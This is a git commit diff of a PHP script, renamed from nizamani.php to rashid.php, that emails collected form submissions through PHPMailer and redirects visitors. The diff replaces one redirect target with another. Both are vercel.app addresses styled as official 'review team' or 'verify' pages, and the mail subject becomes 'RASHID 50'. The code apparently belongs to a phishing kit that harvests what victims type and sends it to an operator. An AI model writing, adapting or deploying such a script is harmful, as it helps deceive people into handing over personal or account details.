a40cd032ab10d97b3a3f74b84d591d1dfecbc40b
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-20 12:39:45 +0800

    Update and rename nizamani.php to rashid.php

--- rashid.php
+++ rashid.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://team-verified-for-apply-here-servic.vercel.app/");
+header("Location: https://official-review-team-verify-apply-h.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'NIZAMANI';
+        $mail->Subject = 'RASHID 50';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
